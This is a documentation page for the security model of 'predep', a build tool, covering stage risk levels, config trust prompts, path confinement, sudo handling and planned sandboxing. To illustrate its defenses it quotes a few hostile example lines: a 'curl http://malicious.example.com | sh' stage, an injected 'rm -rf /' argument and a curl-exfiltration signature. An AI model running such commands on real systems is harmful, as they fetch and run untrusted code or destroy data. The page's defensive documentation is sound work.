---
title: Security Model
weight: 50
---

# Security Model

predep's security model distinguishes three execution layers, each with
different guarantees and risk levels.

## Stage Types by Risk

| Stage type                  | Execution engine            | Shell?         | Risk level                          |
| --------------------------- | --------------------------- | -------------- | ----------------------------------- |
| `run`                       | `/bin/sh -c` / `cmd.exe /c` | Yes            | DANGEROUS                           |
| `binary`                    | `execvp` / `CreateProcessA` | No             | HIGH — schema not yet implemented   |
| `disabled`                  | None (no-op)                | —              | SAFE                                |
| `vendor`/`fetch`/`resource` | None (download only)        | —              | SAFE                                |
| `docker`                    | Docker CLI                  | No (arg-based) | NORMAL                              |
| `group`                     | None (no-op)                | —              | SAFE                                |
| `package`                   | None (file ops)             | —              | SAFE                                |
| `install`                   | None (file ops) / `sudo cp` | No             | NORMAL — file ops, sudo escalation  |
| `uninstall`                 | None (file ops) / `sudo rm` | No             | NORMAL — file ops, sudo escalation  |
| `premake5`                  | `execvp` / `CreateProcessA` | No             | NORMAL — known binary, schema-bound |

> **Note on package managers:** Commands like `npm install`, `pip install`,
> `bun install`, `gem install`, `cargo install`, `go install`, and similar
> package manager invocations execute arbitrary code from remote registries
> during their install lifecycle (pre/post-install scripts, build hooks).
> Even when run via a `binary` stage (which avoids shell injection), the
> package manager itself is a trusted binary but _the packages it installs
> are not_. Treat any stage that invokes a package manager as equivalent to
> `run` in terms of trust — the install scripts have full access to your
> project tree, environment, network, and credentials. If you wouldn't
> `curl | sh` the package, don't `npm install` it either.

## Security Layers

### Layer 0: Config trust prompt

Before any stage executes, `security::check_run_stages()` scans all stages
and presents a warning to the user listing every `run` and `binary` command
that will be executed. The user must explicitly confirm. In non-interactive
mode (no TTY), execution is blocked unless `--privileged` is passed (see [Layer 6](#layer-6-path-confinement)).

Once confirmed, the config file's SHA256 is cached as trusted so repeated
runs don't re-prompt (unless the file changes). The file path is recorded
alongside the hash so the user can see which configuration was approved.

#### Prompt matrix

Whether a security prompt blocks execution depends on three factors: the
safety level of the operation, whether `--privileged` is active (selects the
prompter type), and whether the configuration SHA256 is already trusted.
Trusted configs skip the prompt entirely (auto-ok across all levels).

| Level | Interactive (TTY) | Interactive (headless) | Privileged (TTY) | Privileged (headless) |
|-------|-------------------|------------------------|------------------|-----------------------|
| `safe` | auto-ok | auto-ok | auto-ok | auto-ok |
| `warning` | draw_box → auto-ok | auto-ok | draw_box → auto-ok | auto-ok |
| `dangerous` | draw_box + y/N | error: use `--privileged` | draw_box + countdown → proceed | countdown → proceed |
| `critical` | draw_box + error: need `--privileged` | error: use `--privileged` | draw_box + y/N → countdown → proceed | countdown → proceed |

- `warning` is reserved for future use — current callers always use `dangerous`.
- `countdown` is a 2-second stderr countdown before execution proceeds.

#### Trust expiry

Trusted SHA256 entries expire after a configurable period (default: 7 days)
unless marked `permanent`. Expired entries are automatically cleared on the
next `resolve()` call. The trust time is configured in the prefs file:

```toml
trust_time_minutes = 10080   # 7 days

[[trusted]]
sha256 = "abc123..."
trusted_at = 1718000000
permanent = false
paths = ["/home/user/project/predep.toml"]

[[trusted]]
sha256 = "def456..."
trusted_at = 1718086400
permanent = true             # never expires
paths = [
    "/home/user/project/trusted/predep.toml",
    "/home/user/project/vendored/predep.toml",
]
```

The prefs file is located at `cache://preferences/trusted.toml`. Users can
edit it directly to remove entries, set `permanent = true`, or adjust the
trust window. To view the current trust state:

```bash
cat "$(predep --cache-dir)/preferences/trusted.toml"
```

#### Include trust

When a root manifest uses `[[include]]` to import stages from other files,
each included file is tracked and hashed independently. The SHA256 trust is
**per-file**, not aggregate. This means:

- A previously trusted included file can change without invalidating the root
  config's trust — it simply becomes untrusted on the next run.
- If an included file contains new `run` or `binary` stages, the prompt will
  list its path and tell you to review it before confirming.
- Trusting the prompt adds only the **untrusted files'** SHA256 hashes to the
  trust store. Previously trusted files (root or other includes) remain
  trusted without re-prompting.

**Attack scenario:** An attacker modifies an included `vendor/B/predep.toml`
to add a malicious `run` stage. The root config's SHA256 has not changed, so
it remains trusted. However, the included file's SHA256 has changed, so the
security prompt fires with:

```
The following configuration files are not yet trusted:
    /home/user/project/vendor/B/predep.toml

Please review these files before confirming.

Commands that will be executed:
  * [B::evil] curl http://malicious.example.com | sh
```

The user must explicitly confirm before the modified include takes effect.

If the included file has no `run` or `binary` stages (e.g. only download or
docker stages), its SHA256 is still tracked but no prompt is shown — there
is nothing to execute. The file remains untrusted in the trust store until
a subsequent run introduces executable stages from it.

#### Harmful SHA256 database (future)

A future version of predep will maintain a database of known harmful SHA256
hashes — combinations of config hash, stage commands, and binary invocations
that are known to be malicious. This database will be distributed as a
signature file similar to antivirus scanners, allowing predep to reject
known-dangerous configurations before prompting the user.

Format sketch:

```toml
[[signature]]
sha256 = "known-bad-hash..."
type = "run"
description = "Malicious curl pipe to shell"
severity = "critical"

[[signature]]
sha256 = "known-bad-hash..."
type = "binary"
binary = "curl"
description = "Data exfiltration via curl"
severity = "high"
```

When a config SHA256 matches a known signature, predep will display a
blocking error referencing the signature database. Users will be able to
update the database via `predep --update-signatures` or from a well-known
URL.

#### Per-stage trust (future)

The current model trusts entire files — any change to a file invalidates
all its stages. A future refinement could trust individual stages by their
canonical definition (name, type, commands, dependencies, vars):

```toml
[[trusted]]
sha256 = "stage-hash..."
type = "run"
name = "build-sdl"
commands = ["./configure", "make"]
depends = ["fetch-sdl"]
```

This would mean changing one stage in a file does not invalidate trust for
other stages in the same file. Combined with a **Merkle dependency chain**,
a stage's trust hash could incorporate the hashes of its dependencies. If
stage `A` depends on stage `B` and `B` changes, `A`'s trust is automatically
invalidated too — the user sees exactly which transitive change broke trust
and can review the impacted chain.

Not yet implemented. The per-file model already catches the core attack
surface (any modified file re-prompts); per-stage would refine precision.

### Layer 1: No interpolation on binary args

`${VAR}` substitution is strictly limited to **URLs and paths** in download
entries (`fetch_entry::url`, `fetch_entry::dest`). Binary stage `params`,
`args`, and the `binary` name itself are **never interpolated**. This
prevents an attacker from smuggling shell metacharacters through variable
expansion into an argument vector.

### Layer 2: No shell for `binary` stages

`process::run()` on POSIX uses `execvp()` — no `/bin/sh -c`, no shell
operators (`$()`, `` ` ``, `;`, `|`, `&`). On Windows it uses
`CreateProcessA` with a flat command line. Both treat every argument as
a literal string — no metacharacters are interpreted.

This means `--flag=--flag; rm -rf /` in a `binary` stage reaches the
child process as a literal argv token. The shell never sees it.

### Layer 3: PATH confinement

Binary stages check `cache://bin` (with cross-platform `.exe` suffix via
`platform::exe_name()`) before falling back to system PATH. This lets
projects vendor their own tooling without depending on globally installed
binaries — and prevents accidentally running a different binary with the
same name from elsewhere on the system.

### Layer 4: Runtime arg validation (roadmap)

Future binary metadata files (defined outside C++ — e.g. `binaries/*.toml`)
will enable per-argument safety tagging:

```toml
[binary.hugo]
description = "Static site generator"

[binary.hugo.args.contentDir]
type = "path"
safety = "safe"

[binary.hugo.args.rm]
type = "flag"
safety = "dangerous"
```

Until this is implemented, all `params` and `args` on `binary` stages are
treated as DANGEROUS:

| Field    | Structure             | Risk                                      |
| -------- | --------------------- | ----------------------------------------- |
| `params` | `--key value` pairs   | DANGEROUS — no schema, no type validation |
| `args`   | Free-form argv tokens | DANGEROUS — no structure, no validation   |

### Layer 5: Shape validation (planned)

The following gates are identified for a future `validate_binary_args()` in
`src/security/security.h`:

| Check                                                                                                    | Behaviour   | Rationale                                                                           |
| -------------------------------------------------------------------------------------------------------- | ----------- | ----------------------------------------------------------------------------------- |
| Null bytes in any param key, value, or arg token                                                         | HARD REJECT | `execvp` accepts null-terminated strings; null byte truncates the argument silently |
| Token exceeds 4096 bytes                                                                                 | HARD REJECT | Prevents argv buffer overflows in the child process                                 |
| Param key not matching `[a-zA-Z0-9_-]+`                                                                  | WARN        | `--` smuggling: keys like `--flag=--injected` or `..` can confuse argument parsers  |
| Shell metacharacters in value/arg (`$`, `` ` ``, `;`, `\|`, `&`, `>`, `<`, `(`, `)`, `{`, `}`, `!`, `\`) | WARN        | Harmless to `execvp` but signals possible config confusion or injection attempt     |
| Path separators in binary name (`/`, `\`, `..`)                                                          | WARN        | Restricts to PATH/`cache://bin` lookup; prevents `../../etc/passwd` style tricks    |

WARN-level checks do not block execution but are surfaced during the config
trust prompt, giving the user additional information before confirming.

### Layer 6: Path confinement

All `dest` fields (`fetch_entry::dest`, `docker_entry::dest`) and `artifact
source` paths are validated against the project root and cache directory. Any resolved path that falls outside `ctx.root` or `ctx.cache_dir`
is **rejected** unless `--privileged` is used.

Paths are expressed using the `root://` and `cache://` prefixes, which
resolve to the project root and platform cache directory respectively.
Absolute paths like `/var/lib/evil` or `/root/.ssh/authorized_keys` are
blocked at the security check layer.

#### `--privileged` flag

To allow system-path access, pass `--privileged`:

```bash
predep --privileged <stage>
```

When `--privileged` is used:

1. The config file's SHA256 **must already be in the trusted prefs** — either
   added by a previous non-privileged run with a security prompt confirmation,
   or manually inserted into `cache://preferences/trusted.toml`.
2. If the SHA256 is not trusted, predep fails with a message showing the
   prefs file path so the user can pre-approve it.
3. In interactive (TTY) mode, a prominent warning is shown with a **2-second
   countdown** before execution begins.

This ensures that `--privileged` cannot be used on an untrusted config
without explicit prior approval.

#### Overridden flags

`--privileged` replaces the earlier `--force` flag, which was never fully
wired. Unlike `--force`, `--privileged` does not skip security prompts for
`run`/`binary` stages — those still require interactive confirmation.

### Sudo escalation (`install` / `uninstall` stages)

When an `install` or `uninstall` stage writes to a system directory (e.g.
`/usr/local/bin`) and the current user lacks write permission, predep
automatically falls back to `sudo cp` / `sudo rm -f` / `sudo mkdir -p` for
the individual file operations. This is the standard `make install` pattern.

Each sudo invocation runs as a separate subprocess via `execvp("sudo", ...)`.
Once the subprocess completes, no elevated privileges remain — sudo's
credential cache may persist (controlled by `sudoers(5)` `timestamp_timeout`),
but the predep process itself never holds root privileges.

The `--privileged` flag is not required for sudo fallback — sudo prompts for
the user's password via the TTY independently. However, if the config also
references paths outside the project root (e.g. `dir = "/opt/myapp"`),
`--privileged` is still needed for the path confinement check.

#### Credential cache hardening

To prevent a malicious stage (e.g. a `run` stage) from inheriting sudo
credentials cached by install/uninstall, each resolve call:

1. Runs `sudo -K` **before** any file operations — clears any stale
   credentials inherited from outside the predep process (e.g. a previous
   `sudo` command in the same terminal session).
2. Runs `sudo -K` **after** all operations — removes the credential cache
   created by our own sudo invocations, so subsequent stages cannot execute
   privileged commands without a fresh password prompt.

This ensures that sudo credentials exist only for the duration of the
install/uninstall resolve call itself, never across stages.

#### Root / sudo startup guard

When predep starts, `security::check_root_sudo()` verifies the process is
not running with elevated privileges:

| Condition | Behavior |
|-----------|----------|
| `getuid() == 0` + `SUDO_USER` set | Running via `sudo`. Error: "Do not run predep with sudo." |
| `getuid() == 0` + `SUDO_USER` unset | Running as root directly. Error: "Do not run predep as root." |
| `getuid() != 0` | Normal user — allowed. |

The guard is bypassed when `--privileged` is combined with a non-TTY session
(headless/CI mode). This permits containerized or automated deployments that
deliberately run as root with `--privileged`.

This prevents the most dangerous attack vector: a config with `run` stages
executing arbitrary commands as root because the user accidentally ran
`sudo predep`.

| File operation | Direct call | Sudo fallback |
|----------------|-------------|---------------|
| Copy file | `fs::copy()` | `sudo cp <src> <dst>` |
| Copy directory | `fs::copy()` recursive | `sudo cp -r <src> <dst>` |
| Remove file | `fs::remove()` | `sudo rm -f <path>` |
| Create directory | `fs::create_directories()` | `sudo mkdir -p <path>` |
| Create symlink | `fs::create_symlink()` | `sudo ln -sf <target> <link>` |
| Remove symlink | `fs::remove()` | `sudo rm -f <link>` |

Sudo escalation is **not available on Windows** — install/uninstall on
Windows must target user-writable directories or run as Administrator.

### Future: distro package manager integration

The current `sudo cp` approach is portable but not idiomatic for any
platform. Future versions should support generating native packages so
installed artifacts integrate with the system package manager:

| Platform / Distro | Package format | Toolchain |
|---|---|---|
| Debian / Ubuntu | `.deb` | `dpkg-deb`, `equivs` |
| Fedora / RHEL | `.rpm` | `rpmbuild`, `fpm` |
| Arch Linux | PKGBUILD / `.pkg.tar.zst` | `makepkg` |
| Alpine | `.apk` | `abuild` |
| macOS | Homebrew formula | `brew` tap |
| macOS | `.pkg` | `pkgbuild` |
| Windows | `.msi` / NuGet | `wixtoolset` |

This would replace `sudo cp` with:
- `dpkg -i`, `rpm -i`, `pacman -U` on Linux
- `brew install` on macOS
- Windows MSI installer

Selection would use `platform.h` OS-identification as the default
fallback (auto-detect `.deb` on Debian, `.rpm` on Fedora, Homebrew on
macOS, etc.), overridable at runtime (e.g. `--pkg deb` or `--pkg homebrew`)
for cross-platform packaging or CI scenarios. The plain `sudo cp` mode
stays as the portable fallback when no native backend is available or
requested.

## Sandboxing (future)

Dangerous stages (`run`, `binary` with untrusted params) and general builds
should ideally run in a sandboxed environment. Currently, the only isolation
mechanism is the `docker` stage type, which builds inside a container and
copies out the target artifact. This provides filesystem isolation but does
not enforce network or capability restrictions.

Future versions may integrate additional sandboxing technologies:

* **Bubblewrap / Firejail** — lightweight user-space sandboxing on Linux,
  no root required

* **cgroups / seccomp** — kernel-level resource limits and syscall filtering
  for fine-grained permission control

* **WebAssembly runtimes (Wasmtime / Wasmer)** — pure sandbox execution for
  build steps that don't need native host access

* **NsJail / container sandboxes** — alternative container runtimes with
  stricter default profiles than Docker

The sandbox abstraction will be designed as a pluggable backend, so the
stage definition remains declarative and the user chooses the isolation
level at runtime or in config.

## Comparison: `run` vs `binary`

| Aspect                | `run`                   | `binary`                              |
| --------------------- | ----------------------- | ------------------------------------- |
| Invocation            | `sh -c "... {{shell}}"` | `execvp(hugo, argv)`                  |
| Shell injection       | YES — full              | NO — `execvp` treats args as literals |
| `${VAR}` expansion    | YES                     | NO (except URL fields on download)    |
| Known binary          | No (arbitrary shell)    | Yes (named in `binary` field)         |
| PATH safety           | PATH prepended          | `cache://bin` checked first           |
| Cross-platform `.exe` | Manual                  | Auto via `platform::exe_name()`       |
| Risk level            | DANGEROUS               | HIGH (pending metadata schema)        |
